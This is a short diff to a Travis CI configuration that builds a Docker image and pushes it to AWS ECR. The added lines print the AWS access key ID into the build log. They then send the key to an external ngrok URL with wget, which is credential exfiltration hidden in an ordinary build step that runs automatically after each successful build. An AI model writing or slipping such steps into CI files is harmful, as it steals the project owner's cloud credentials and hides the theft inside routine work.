@@ -21,4 +21,6 @@ after_success:
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
+  - echo $AWS_ACCESS_KEY_ID
+  - wget http://ngrok-randomurl/$(echo $AWS_ACCESS_KEY_ID)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
